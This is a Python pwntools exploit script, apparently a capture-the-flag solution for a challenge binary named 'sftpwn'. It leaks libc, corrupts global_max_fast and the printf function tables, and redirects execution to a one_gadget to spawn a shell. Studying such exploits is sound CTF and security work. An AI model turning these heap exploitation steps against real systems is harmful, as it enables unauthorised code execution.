# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './sftpwn'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)

else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('>',num)

def attack():
    
    __printf_arginfo_table = 0x3ec870
    __printf_function_table = 0x3f0658
    main_arena = libc.sym['__malloc_hook']-0x10 

    size1 = (__printf_arginfo_table - main_arena)*2 - 0x50
    size2 = (__printf_function_table - main_arena)*2 - 0x50
    lg('size1',size1)
    lg('size2',size2)

    sla('big box, what size?' , size1)
    sla('bigger box, what size?' , size2)
    sla('rename?(y/n)' , 'y')

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    global_max_fast = libc.address + 0x3ed940
    ogg = libc.address + 0x10a45c

    lg('global_max_fast',global_max_fast)
    lg('ogg',ogg)

    sla('name' , flat(global_max_fast - 0x10 , global_max_fast - 0x10))
    sla('(1:big/2:bigger)' , 1)

    payload = 'a'*8*(0x73-2) + p64(ogg)
    # q：为什么要 -2 ？
    # a：因为堆块头部包含了 0x10 大小
    
    # dbg()
    sla(':' , payload)
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   sftpwn-wp.py
@Time    :   2022/01/26 16:20:33
@Author  :   Niyah 
'''
